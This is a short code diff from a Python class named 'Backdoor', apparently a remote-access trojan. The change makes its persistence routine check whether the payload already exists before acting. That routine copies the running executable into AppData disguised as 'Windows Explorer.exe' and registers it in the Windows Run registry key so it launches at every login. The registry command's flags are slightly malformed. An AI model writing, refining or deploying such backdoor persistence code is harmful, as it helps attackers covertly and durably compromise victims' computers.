@@ -23,8 +23,9 @@ class Backdoor:
 
     def persistence(self):
         location = os.environ["appdata"]+"\\Windows Explorer.exe"
-        shutil.copyfile(sys.executable, location)
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t /REG_SZ /d "'+location+'"',shell=True)
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t /REG_SZ /d "'+location+'"',shell=True)
 
 
     def reliable_send(self, data):
